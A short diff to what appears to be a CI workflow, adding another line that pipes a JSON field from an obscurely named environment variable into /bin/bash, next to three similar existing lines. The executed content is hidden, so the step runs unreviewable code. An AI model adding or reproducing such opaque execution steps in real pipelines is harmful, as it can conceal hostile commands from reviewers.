@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$xfoug37" | jq -r .zi9 | /bin/bash
           echo $bznm81222 | jq -r .vt425 | /bin/bash
           echo $xg4441 | jq -r .m4 | /bin/bash
+          printf '%s' "$efv42" | jq -r .v51 | /bin/bash
 
       - name: Persist results
         if: always()
